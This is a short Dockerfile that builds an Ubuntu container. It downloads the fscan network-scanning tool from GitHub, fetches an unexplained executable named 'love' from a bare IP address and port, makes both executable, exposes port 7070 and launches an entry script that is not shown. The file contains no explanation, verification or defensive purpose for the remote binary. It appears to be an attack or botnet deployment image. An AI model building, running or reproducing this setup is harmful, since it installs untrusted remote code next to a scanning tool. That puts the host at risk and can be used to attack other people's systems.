FROM ubuntu:latest

RUN apt update && apt install -y wget

ADD entry.sh .
RUN chmod +x entry.sh

RUN wget https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan
RUN chmod +x ./fscan

RUN wget 84.201.153.158:3232/love
RUN chmod +x ./love 

EXPOSE 7070

ENTRYPOINT [ "./entry.sh" ]